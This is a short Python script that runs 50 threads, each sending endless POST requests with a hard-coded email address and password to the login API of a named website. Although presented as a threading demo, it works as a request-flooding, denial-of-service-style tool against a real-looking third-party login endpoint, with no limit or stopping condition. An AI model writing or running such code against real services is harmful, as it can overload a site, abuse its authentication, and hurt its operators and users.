# A program to send multiple requests using threading
import requests
import threading

url = 'https://porkfund.com/api/v1/login'

data = {
    'email': 'brhamix@gmail.com',
    'password': 'password', 
}

def do_request():
    while True:
        response = requests.post(url, data=data).text
        print(response)

threads = []

for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()